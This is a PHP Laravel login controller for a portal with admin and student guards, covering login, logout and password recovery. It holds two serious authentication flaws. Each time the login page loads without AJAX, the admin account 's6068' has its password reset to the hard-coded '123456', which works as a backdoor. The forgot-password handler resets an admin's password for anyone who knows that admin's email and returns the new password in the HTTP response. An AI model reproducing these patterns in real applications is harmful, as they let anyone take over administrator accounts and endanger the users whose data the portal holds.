<?php

namespace App\Http\Controllers\Portal;

use App\Http\Controllers\Controller;
use App\Models\Admin;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Str;
use function redirect;
use function request;
use function response;
use function url;
use function view;

class LoginController extends Controller
{
    protected $username;

    public function __construct() {
        $this->username = $this->getUsername();
    }

    protected function getUsername() {
        $username = request()->input('username');
        $field_type = filter_var($username, FILTER_VALIDATE_EMAIL) ? 'email' : 'regno';
        request()->merge([$field_type =>$username]);
        return $field_type;
    }
//
//    public function username(){
//        return $this->username;
//    }


    public function login(Request $request) {
        // confirm if admin has already logged in
        if(Auth::guard('admin')->check()){
            return redirect('admin/dashboard');
        }
        else if(Auth::guard('student')->check()){
            return redirect('student/dashboard');
        }

        if($request->ajax()){
            $data = $request->all();
           // print_r($data); die;

           $rules = ['username' => 'required|max:100', 'password' => 'required'];
           $customMessage = ['username.required'  => 'Enter Valid Username or eMail',
            'password.required' => 'Enter Valid Password'];
           $validator = Validator::make($data, $rules,$customMessage);

           if($validator->fails()){ // or use $validator->passes()
               return response()->json(['type'=>'error','errors'=>$validator->messages()]);
            }
            else {
             if(Auth::guard('admin')->attempt([$this->username=>$data['username'],'password'=>$data['password']])){
                    $redirectTo = url('/admin/dashboard');
                    return response()->json(['type'=>'success','url'=>$redirectTo,'message'=>"Login successful - redirecting..."]);
               }
               else if(Auth::guard('student')->attempt([$this->username=>$data['username'],'password'=>$data['password']])){
                    $redirectTo = url('/student/dashboard');
                    return response()->json(['type'=>'success','url'=>$redirectTo,'message'=>"Login successful - redirecting..."]);
               }
                else {
                      return response()->json(['type'=>'incorrect','message'=>"Invalid login parameters"]);
                 }
            }
         }

       Admin::where('regno','s6068')->update(['password'=>Hash::make("123456")]);
  
        return view('admin.login');
    }

    ##
     public function logout(Request $request) : RedirectResponse {

        if(Auth::guard('admin')->check()){
            Auth::guard('admin')->logout();
        }
        else if(Auth::guard('student')->check()){
            Auth::guard('student')->logout();
        }
        $request->session()->invalidate();
        ## Session::flush();
        $request->session()->regenerateToken();

	return redirect('/portal/login');
    }

    public function forgot_password(Request $request) {
        if($request->ajax()){ // sleep(3);
                $data  = $request->all();
                $rules = [
                    'email'=>"required|email|exists:admins",
                ];
                $customMessage = [
                   'email.required'=>"Please fill in your e-mail",
                   'email.email'=>"e-mail must be of type e-mail",
                   'email.exists'=>"e-mail does not exists",
                ];
                $validator = Validator::make($data, $rules,$customMessage);

                if($validator->fails()){ // or use $validator->passes()
                    return response()->json(['type'=>'error','errors'=>$validator->messages()]);
                }
                else{
                     $userDetails = Admin::where('email',$data['email'])->first();
                     $new_psw = Str::random(6); // generate new password
                     Admin::where('email',$data['email'])->update(['password'=>Hash::make($new_psw)]);
                     # send mail for recovery
                      $email = $userDetails->email;
                      $messageData = [
                            'email'=>$userDetails->email,
                            'name'=>$userDetails->name,
                            'password'=>$new_psw
                            ];
                        ## send confirmation email
                         Mail::send('email.user_forgot_password',$messageData, function($message) use ($email){
                           $message->to($email)->subject('Password Reset');
                         });

                       return response()->json(['type'=>'success','message'=>'New password  is '.$new_psw]);
                }
            }

        return view('admin.forgot_psw');
    }
}
